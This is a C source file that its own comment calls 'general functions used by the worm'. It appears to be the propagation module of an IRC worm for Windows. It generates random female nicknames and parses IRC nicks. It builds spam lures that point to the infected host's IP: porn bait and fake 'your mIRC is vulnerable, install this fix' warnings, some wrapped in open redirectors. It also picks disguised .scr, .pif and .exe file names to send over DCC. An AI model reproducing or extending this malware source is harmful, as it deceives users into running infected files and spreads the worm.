#include "stdafx.h"
#include "stdlib.h"
#include "winsock2.h"
#include "wininet.h"

/* general functions used by the worm */

#pragma comment(lib,"wininet.lib")

char *NickList[]={"Anita","April","Ara","Aretina","Amorita","Alysia","Aldora",
				"Barbra","Becky","Bella","Briana","Bridget","Blenda","Bettina",
				"Caitlin","Chelsea","Clarissa","Carmen","Carla","Cara","Camille",
				"Damita","Daria","Danielle","Diana","Doris","Dora","Donna",
				"Ebony","Eden","Eliza","Erika","Eve","Evelyn","Emily",
				"Faith","Gale","Gilda","Gloria","Haley","Holly","Helga",
				"Ivory","Ivana","Iris","Isabel","Idona","Ida","Julie",
				"Juliet","Joanna","Jewel","Janet","Katrina","Kacey","Kali",
				"Kyle","Kassia","Kara","Lara","Laura","Lynn","Lolita",
				"Lisa","Linda","Myra","Mimi","Melody","Mary","Maia",
				"Nadia","Nova","Nina","Nora","Natalie","Naomi","Nicole",
				"Olga","Olivia","Pamela","Peggy","Queen","Rachel","Rae",
				"Rita","Ruby","Rosa","Silver","Sharon","Uma","Ula",
				"Valda","Vanessa","Valora","Violet","Vivian","Vicky","Wendy",
				"Willa","Xandra","Xylia","Xenia","Zilya","Zoe","Zenia"
};

const int NumberOfNames=105;


BOOL	ThereIsInet=FALSE;
const char CheckSite[]="http://www.google.com/";


void GetRndUserStr(char *dst,BOOL numbers)
{
	srand(GetTickCount());
	
	if(numbers==TRUE)
		wsprintf(dst,"%s%d",NickList[rand() % NumberOfNames],10+(rand() % 20));
	else
		wsprintf(dst,"%s",NickList[rand() % NumberOfNames]);
}


void RandomString(char *dst,int len,BOOL Gen_Numbers)
{
	int i=0,randn=0;
	
	srand(GetTickCount()); // init random number generator

	do
	{
		randn=(rand() % 90); // gen random number between 0 ~ 90

		if(randn<30 && i!=0 && Gen_Numbers==TRUE)
			dst[i]=(48 + (rand() % 9));		//gen number
		else if(randn<60)
			dst[i]=(98 + (rand() % 24));	//gen lower case letter
		else if(randn>60)
			dst[i]=(66 + (rand() % 24));	//gen upper case letter

		i++;
		len--;

	}while(len!=0);

	dst[i]=NULL;
}


void GenUrlSpamMessage(char *dst,char userip[])
{
	int style;
//////////////////////////////////////////////////////////////
	char *s1part1[]={"hey","heya","hi","hello","w00t"};

	char *s1part2[]={"looking for some hot porn ?",
				   "need free porn ?",
				   "wanna see hot girls for free ?",
				   "hardcore xxx porno for free !",
				   "for free porn galerys..."};

	char *s1part3[]={"check out -->",
					 "visit ==>>>",
					 "take a look at ->",
					 "download the free viewer at >"};

	char *s1files[]={"HardCore-XXX-Pictures.scr",
					 "Hot_Girls_Sucking_Dicks.scr",
					 "Tiny_Woman_Swallows.pif",
					 "Hot-XXX-Pictures-Collection.rar",
					 "HiddenXXXPhotos.rar",
					 "YoungFreshPussy.exe",
					 "Extream-Hardcore-XXX.pif"};
///////////////////////////////////////////////////////////////
	char *s2part1[]={"excuse me,but its seems that",
					"its looking like that",
					"hey,i think that",
					"hi,i can see that"};

	char *s2part2[]={"you are infected with a trojan...",
					"you are using a vulnerable version of mirc",
					"your windows is not patched...",
					"your mirc is sending spam",
					"your computer is vulnerable to the new mirc exploit"};

	char *s2part3[]={"please download repair tool from -> ",
					"please install this security update ->",
					"please download a fix from ->",
					"please install the new patch so you will be protected",
					"so get yourself ASAP this repair from"};

	char *s2files[]={"SystemRepair.exe",
					"Fix_Mirc.exe",
					"Trojan-Remover.exe",
					"MircSecurity.exe",
					"Windows_Update.exe",
					"SecurityUpdate.exe",
					"SystemFix.exe",
					"WinXP_Mirc_Fix.exe"};
//////////////////////////////////////////////////////////////////////////

	char *s3part1[]={"ever wanted to have access to",
					"would you like to download",
					"do you want to get yourself",
					"looking for",
					"searching for"};

	char *s3part2[]={"hundred of",
					"good quality",
					"high resolution",
					"a full library of",
					"a full galery of"};

	char *s3part3[]={"hardcore porno",
					 "xxx movies",
					 "porn pictures",
					 "free porno movies",
					 "short porno movies"};

	char *s3part4[]={"if so,just download the free trial viewer from ->",
					 "no need to wait,get the access now from ->",
					 "just double click on :",
					 "just download the free movie from",
					 "check out",
					 "take a look at"};

	char *s3files[]={"Free-Porno-Gallery.exe",
					 "XXX-PORNO-LIBRARY.com",
					 "SEX-mirc-Access.rar",
					 "Free-Hardcore-Sex.rar",
					 "PornPicturesCollection.rar",
					 "Vivid_Sex_Trial.exe",
					 "JennaAndKelly.com"};
////////////////////////////////////////////////////////////////////////////


	char *s4part1[]={"heya","hey","whats up?","hey,how you doing?","hello","hi"};

	char *s4part2[]={"please visit my",
					"take a look at my",
					"what do you think about my",
					"is my","how is my"};
	
	char *s4part3[]={"webcam pictures",
					"nude pictures",
					"gallery",
					"web site",
					"porn movie",
					"family"};

	char *s4part4[]={"and tell me what is your opinion",
					"and tell me what you think,please",
					":)"};

	char *s4files[]={"Webcam.com","nude-gallery.com","jenna_family.scr",
					"porno.pif","Sex4Free.pif","sex-cum-4free.pif","Vivid-Sex.com"};


	char *s4redirectors[]={"http://www.hard-core-dx.com/redirect.php?",
						"http://neworder.box.sk/redirect.php?",
						"http://hornygoat.org/stats/redirect.php?",
						"http://www.google.com/url?q="};

////////////////////////////////////////////////////////////////////////////

	char *s5part1[]={"hey","hello","heya","hi"};

	char *s5part2[]={"You can find DVD Quality Amateur Porn Movies here =>",
					"wanna have a free trial at porn sites all over the world ?,get this =>",
					"wants to have access to free DVD porn download =>",
					"wants free 30 days trial at porn gallerys ?,check out >",
					"intersting in porno ?,wanna get free access,check out -->",
					"free europen porn ! get it now from ===>>>"};

	char *s5redirect[]={"http://www.magadoo.com/goto.php?url=",
						"http://www.spodesabode.com/link.php?url=",
						"http://www.onlyphp.com/redirect.php?url=",
						"http://www.syntechsoftware.com/redirect.php?base=",
						"http://rd.walla.co.il/ts.cgi?i=43132&u=",
						"http://www.rediff.com/rss/redirect.php?url=",
						"http://www.google.com/url?q="};

	char *s5files[]={"FreeAmateurPorno.pif","Hardcore-XXX-Porno.rar",
					"Family_Sex.com","DivXPorno.pif","EuroSex4Free.pif",
					"TrialXXXView.scr","AsianPorno4Free.scr","DixPorno.scr"};


	srand(GetTickCount());

	style=(rand() % 5);

	if(style==1)
		wsprintf(dst,"%s,%s %s http://%s/%s",s1part1[rand() % 5],
		s1part2[rand() % 5],s1part3[rand() % 4],userip,s1files[rand() % 7]);
	else if(style==2)
	{
		wsprintf(dst,"%s %s,%s http://%s/%s",s2part1[rand() % 4],
			s2part2[rand() % 5],s2part3[rand() % 5],userip,s2files[rand() % 8]);
	}	
	else if(style==3)
	{
		wsprintf(dst,"%s %s %s ?,%s http://%s/%s",s3part1[rand() % 5],
			s3part2[rand() % 5],s3part3[rand() % 5],s3part4[rand() % 6],
			userip,s3files[rand() % 7]);
	}
	else if(style==4)
	{
		wsprintf(dst,"%s %s %s,%s %shttp://%s/%s",
			s4part1[rand() % 6],s4part2[rand() % 4],s4part3[rand() % 6],s4part4[rand() % 3],
			s4redirectors[rand() % 4],userip,s4files[rand() % 7]);
	}
	else
	{
		wsprintf(dst,"%s,%s %shttp://%s/%s",s5part1[rand() % 4],s5part2[rand() % 6],
			s5redirect[rand() % 7],userip,s5files[rand() % 8]);
	}


}


BOOL GetNickFromBuffer(char *dst,char xbuffer[])
{	
	int i=0;

	if(xbuffer[0]!=':')
		return FALSE;

	for(i=0;i<lstrlen(xbuffer);i++)
		if(xbuffer[i]=='!')
			goto b_ok1;
	
	return FALSE;

b_ok1:

	for(i=0;i<lstrlen(xbuffer);i++)
		if(xbuffer[i]=='@')
			goto b_ok2;
	
	return FALSE;

b_ok2:
	
	for(i=1;i<15;i++)
	{
		if(xbuffer[i]=='!')
			break;
		dst[i-1]=xbuffer[i];
	}

	dst[i-1]=NULL;

	return TRUE;
}



HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter)
{
	DWORD Thread_Id;
	return(CreateThread(NULL,NULL,XThread_Function,Parameter,NULL,&Thread_Id));
}

DWORD WINAPI ConnectSite(LPVOID address)
{
	if(InternetCheckConnection((const char *)address,FLAG_ICC_FORCE_CONNECTION ,0)==TRUE)
		ThereIsInet=TRUE;
	return 1;
}

BOOL ThereIsInetConnection()
{
	DWORD dwTimeOut=10000;
	WaitForSingleObject(XThread(ConnectSite,(void *)&CheckSite),dwTimeOut);
	return ThereIsInet;
}

void WaitForInetConnection()
{
	ThereIsInet=FALSE;
	while(ThereIsInetConnection()!=TRUE)
		Sleep(60*1000);
}

void GetDccFileName(char *dst)
{
	char *FileNames[]={"HardCore-XXX-Pictures","Webcam"
					   "Hot_Girls_Sucking_Dicks","Tiny_Woman_Swallows",
					   "Hot-XXX-Pictures-Collection","HiddenXXXPhotos",
					   "YoungFreshPussy","Extream-Hardcore-XXX"
						"FreeAmateurPorno","Hardcore-XXX-Porno",
						"Family_Sex.com","DivXPorno.pif",
						"EuroSex4Free","TrialXXXView",
						"AsianPorno4Free","DixPorno",
						"nude-gallery","jenna_family",
						"porno.pif","Sex4Free",
						"sex-cum-4free","Vivid-Sex"
						"Free-Porno-Gallery","XXX-PORNO-LIBRARY",
						 "SEX-mirc-Access","Free-Hardcore-Sex",
						 "PornPicturesCollection","Vivid_Sex_Trial",
						 "JennaAndKelly","Photos",
						 "Your_Search","LoveMe",
						 "HomeWork","Mp3B0x",
						 "FreeMp3Downloader","CService",
						 "User_Guide","Password_List",
						 "Readme","Mirc_Update",
						 "BecomeIRCOP","Finded"};

	lstrcpy(dst,FileNames[rand() % 41]);
}